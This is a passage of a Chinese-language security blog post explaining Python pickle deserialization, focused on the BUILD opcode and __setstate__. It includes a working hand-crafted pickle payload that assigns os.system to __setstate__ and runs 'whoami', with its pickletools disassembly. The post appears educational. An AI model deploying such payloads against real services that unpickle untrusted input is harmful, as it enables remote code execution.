+<h4 id="b操作符"><a href="#b操作符" class="headerlink" title="b操作符"></a>b操作符</h4><h5 id="getstate-和-setstate"><a href="#getstate-和-setstate" class="headerlink" title="__getstate__和__setstate__"></a><code>__getstate__</code>和<code>__setstate__</code></h5><ol>
+<li>Q: state是什么?<ol>
+<li>A: 在 Python 中，对象的状态（state）通常指的是<strong>对象的所有属性及其值</strong>。这些属性可以是实例变量、类变量等</li>
+</ol>
+</li>
+<li><code>object. __getstate__()</code><ol>
+<li>官方文档:  It is called and the returned object is pickled as the contents for the instance, instead of a default state –&gt; 总的来说就是<strong>封装一个对象的属性信息</strong><ol>
+<li>对于具有__slots__但没有实例__dict__的类，默认状态是一个元组，其第一项是None，第二项是一个字典，该字典将插槽名称映射到上一个项目符号中描述的插槽值。</li>
+<li>对于具有实例__dict__和__slots__的类，默认状态是由两个字典组成的元组：<code>self.__dict__</code>，以及一个将插槽名称映射到插槽值的字典。只有具有值的插槽才包括在后者中。</li>
+<li>对于有实例__dict__而没有__slots__的类，默认状态是<code>self.__dict__</code></li>
+<li>对于没有instance__dict__和__slots__的类，默认状态为None</li>
+</ol>
+</li>
+<li><strong>版本信息</strong>: 在3.11版中更改：在object类中添加了<code>__getstate__()</code>方法的默认实现</li>
+</ol>
+</li>
+<li><code>object.__setstate__()</code><ol>
+<li>官方文档 –&gt; 总的来说就是恢复一个对象的属性信息并复原<ol>
+<li>在unpickle时，如果类定义了__setstate__()，它将以unpickle状态被调用。在这种情况下，不需要状态对象是字典。否则，pickle状态必须是一个字典，并且它的项被分配给新实例的字典<code>__dict__</code>；</li>
+<li>如果<code>__reduce__</code>在pickle时返回值为None的状态，则在解pickle时不会调用__setstate__()方法</li>
+</ol>
+</li>
+</ol>
+</li>
+<li><strong>setstate和getstate在pickle中的运用</strong>: 如果你没有为你的类定义这些方法，那么 pickle 模块将使用它自己的默认行为来处理对象的状态<ol>
+<li>如果你没有定义 <code>__setstate__</code> 方法，pickle 会直接更新对象的 <code>__dict__</code> 或 <code>__slots__</code> 中的属性。也就是说，pickle 会根据反序列化得到的数据来恢复对象的状态</li>
+<li>如果你没有定义 <code>__getstate__</code> 方法，pickle 将会尝试序列化整个对象的 <code>__dict__</code>（即所有实例变量）。如果对象使用了 <code>__slots__</code>，那么 pickle 会序列化 <code>__slots__</code> 中定义的所有属性</li>
+</ol>
+</li>
+</ol>
+<h5 id="b-payload"><a href="#b-payload" class="headerlink" title="b_payload"></a>b_payload</h5><ol>
+<li><p>给出payload：<code>b&quot;c__main__\ntest\n)\x81&#125;X\x0c\x00\x00\x00__setstate__cos\nsystem\nsbX\x06\x00\x00\x00whoamib.&quot;</code>，对着pickleTools进行分析</p>
+<ol>
+<li>这里是利用空的dict来构造setitem里的payload，再将其set到<code>__main__.test</code>实例里面（空构造函数）</li>
+</ol>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">0</span>: c    GLOBAL     <span class="string">&#x27;__main__ test&#x27;</span></span><br><span class="line"><span class="number">15</span>: )    EMPTY_TUPLE</span><br><span class="line"><span class="number">16</span>: \x81 NEWOBJ</span><br><span class="line"><span class="number">17</span>: &#125;    EMPTY_DICT</span><br><span class="line"><span class="number">18</span>: X    BINUNICODE <span class="string">&#x27;__setstate__&#x27;</span></span><br><span class="line"><span class="number">35</span>: c    GLOBAL     <span class="string">&#x27;os system&#x27;</span></span><br><span class="line"><span class="number">46</span>: s    SETITEM</span><br><span class="line"><span class="number">47</span>: b    BUILD</span><br><span class="line"><span class="number">48</span>: X    BINUNICODE <span class="string">&#x27;whoami&#x27;</span></span><br><span class="line"><span class="number">59</span>: b    BUILD</span><br><span class="line"><span class="number">60</span>: .    STOP</span><br><span class="line">highest protocol among opcodes = <span class="number">2</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>补充一些点</p>
+<ol>
+<li><p><code>&#39;)&#39;</code>: <code>EMPTY_TUPLE    = b&#39;)&#39;   # push empty tuple</code></p>
+</li>
+<li><p><code>&#39;&#125;&#39;</code>: <code>EMPTY_DICT     = b&#39;&#125;&#39;   # push empty dict</code></p>
+</li>
+<li><p><code>&#39;\x81&#39;</code>：这里会对栈顶的元素pop出来，先args后cls，然后生成一个实例</p>
+  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">NEWOBJ         = <span class="string">b&#x27;\x81&#x27;</span>  <span class="comment"># build object by applying cls.__new__ to argtuple</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_newobj</span>(<span class="params">self</span>):</span><br><span class="line">    args = <span class="variable language_">self</span>.stack.pop()</span><br><span class="line">    cls = <span class="variable language_">self</span>.stack.pop()</span><br><span class="line">    obj = cls.__new__(cls, *args)</span><br><span class="line">    <span class="variable language_">self</span>.append(obj)</span><br><span class="line">dispatch[NEWOBJ[<span class="number">0</span>]] = load_newobj</span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+<li><p>还是要回到代码去理解，这里最后一个b看了好久，终于懂了，还是要细细思考代码的运作原理</p>
+<ol>
+<li>这里采用的是类似原型链污染的方法，注意到在b中会获取<code>__setstate__</code>这个attr，而这个payload在前面已经自动把test对象的<code>__setstate__</code>赋值为<code>os.system()</code>，这里再加上传入的参数<code>whomai</code>进行了回调<code>setstate(state)</code>其实就是<code>os.system(&quot;whoami&quot;)</code>，注意python函数也是一个对象</li>
+<li>真正的关键点在于到达回调的链子构造</li>
+</ol>
+</li>
+</ol>
+<h2 id="Marshel进行RCE"><a href="#Marshel进行RCE" class="headerlink" title="Marshel进行RCE"></a>Marshel进行RCE</h2><h2 id="PyYAML进行RCE"><a href="#PyYAML进行RCE" class="headerlink" title="PyYAML进行RCE"></a>PyYAML进行RCE</h2><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol>
+<li><a target="_blank" rel="noopener" href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BPython%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">一文即可，这篇写的也很好</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html">Code-Breaking中的两个Python沙箱</a></li>
+</ol>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E8%AF%9D%E4%B8%8D%E8%AF%B4%E5%85%88%E5%AE%8F%E8%A7%82%E7%90%86%E8%A7%A3"><span class="toc-number">1.</span> <span class="toc-text">二话不说先宏观理解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pickle%E5%BA%93%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">2.</span> <span class="toc-text">pickle库序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%AC"><span class="toc-number">2.1.</span> <span class="toc-text">不同版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pickle%E5%8D%8F%E8%AE%AE%E7%89%88%E6%9C%AC%E4%B8%8E%E5%85%B3%E9%94%AE%E5%87%BD%E6%95%B0"><span class="toc-number">2.2.</span> <span class="toc-text">pickle协议版本与关键函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%AF%E6%93%8D%E4%BD%9C%E5%AF%B9%E8%B1%A1%E5%9F%BA%E6%9C%AC%E8%A7%84%E5%88%99"><span class="toc-number">2.3.</span> <span class="toc-text">可操作对象基本规则</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%81%E5%AD%98%E5%87%BD%E6%95%B0%E4%B8%8E%E7%B1%BB%E7%9A%84%E5%AE%9E%E4%BE%8B"><span class="toc-number">2.4.</span> <span class="toc-text">*封存函数与类的实例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#opcode%E4%B8%8EPVM"><span class="toc-number">3.</span> <span class="toc-text">opcode与PVM</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PVM%E7%9A%84%E7%BB%93%E6%9E%84"><span class="toc-number">3.1.</span> <span class="toc-text">PVM的结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8E%E4%BE%8B%E5%AD%90%E7%90%86%E8%A7%A3opcode"><span class="toc-number">3.2.</span> <span class="toc-text">从例子理解opcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E9%98%B6%EF%BC%9Apickle%E6%BA%90%E7%A0%81%E4%B8%AD%E7%9A%84opcode"><span class="toc-number">3.3.</span> <span class="toc-text">进阶：pickle源码中的opcode</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pickle%E8%BF%9B%E8%A1%8C%E7%AE%80%E5%8D%95RCE"><span class="toc-number">4.</span> <span class="toc-text">pickle进行简单RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-reduce"><span class="toc-number">4.1.</span> <span class="toc-text">利用__reduce__</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E6%90%93opcode"><span class="toc-number">4.2.</span> <span class="toc-text">手搓opcode</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#pickletools%E5%88%86%E6%9E%90%E6%96%B9%E6%B3%95"><span class="toc-number">4.2.1.</span> <span class="toc-text">pickletools分析方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#R%E6%93%8D%E4%BD%9C%E7%AC%A6"><span class="toc-number">4.2.2.</span> <span class="toc-text">R操作符</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#i%E6%93%8D%E4%BD%9C%E7%AC%A6"><span class="toc-number">4.2.3.</span> <span class="toc-text">i操作符</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#o%E6%93%8D%E4%BD%9C%E7%AC%A6"><span class="toc-number">4.2.4.</span> <span class="toc-text">o操作符</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#b%E6%93%8D%E4%BD%9C%E7%AC%A6"><span class="toc-number">4.2.5.</span> <span class="toc-text">b操作符</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#getstate-%E5%92%8C-setstate"><span class="toc-number">4.2.5.1.</span> <span class="toc-text">__getstate__和__setstate__</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#b-payload"><span class="toc-number">4.2.5.2.</span> <span class="toc-text">b_payload</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Marshel%E8%BF%9B%E8%A1%8CRCE"><span class="toc-number">5.</span> <span class="toc-text">Marshel进行RCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PyYAML%E8%BF%9B%E8%A1%8CRCE"><span class="toc-number">6.</span> <span class="toc-text">PyYAML进行RCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ref"><span class="toc-number">7.</span> <span class="toc-text">Ref</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://kc1zs4.github.io/2024/11/16/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%961_%E5%88%9D%E8%AF%86%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://kc1zs4.github.io/2024/11/16/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%961_%E5%88%9D%E8%AF%86%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/&text=python反序列化1_初识利用手法"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://kc1zs4.github.io/2024/11/16/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%961_%E5%88%9D%E8%AF%86%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/&title=python反序列化1_初识利用手法"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://kc1zs4.github.io/2024/11/16/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%961_%E5%88%9D%E8%AF%86%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/&is_video=false&description=python反序列化1_初识利用手法"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=python反序列化1_初识利用手法&body=Check out this article: https://kc1zs4.github.io/2024/11/16/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%961_%E5%88%9D%E8%AF%86%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://kc1zs4.github.io/2024/11/16/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%961_%E5%88%9D%E8%AF%86%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/&title=python反序列化1_初识利用手法"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://kc1zs4.github.io/2024/11/16/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%961_%E5%88%9D%E8%AF%86%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/&title=python反序列化1_初识利用手法"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://kc1zs4.github.io/2024/11/16/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%961_%E5%88%9D%E8%AF%86%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/&title=python反序列化1_初识利用手法"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://kc1zs4.github.io/2024/11/16/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%961_%E5%88%9D%E8%AF%86%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/&title=python反序列化1_初识利用手法"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://kc1zs4.github.io/2024/11/16/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%961_%E5%88%9D%E8%AF%86%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/&name=python反序列化1_初识利用手法&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://kc1zs4.github.io/2024/11/16/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%961_%E5%88%9D%E8%AF%86%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/&t=python反序列化1_初识利用手法"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2025
+    KC1zs4&#39;s Blog
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+  
+<script src="/js/search.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+
+    var $inputArea = $("input#search-input");
+    var $resultArea = document.querySelector("div#search-result");
+
+    $inputArea.focus(function() {
+      var search_path = "search.xml";
+      if (search_path.length == 0) {
+        search_path = "search.xml";
+      }
+      var path = "/" + search_path;
+      searchFunc(path, 'search-input', 'search-result');
+    });
+
+    $inputArea.keydown(function(e) {
+      if (e.which == 13) {
+        e.preventDefault();
+      }
+    });
+
+    var observer = new MutationObserver(function(mutationsList, observer) {
+      if (mutationsList.length == 1) {
+        if (mutationsList[0].addedNodes.length) {
+          $(".search-no-result").hide();
+        } else if (mutationsList[0].removedNodes.length) {
+          $(".search-no-result").show(200);
+        }
+      }
+    });
+
+    observer.observe($resultArea, { childList: true });
+
+  });
+  </script>
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'kc1zs4-github-io';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+</body>
+</html>
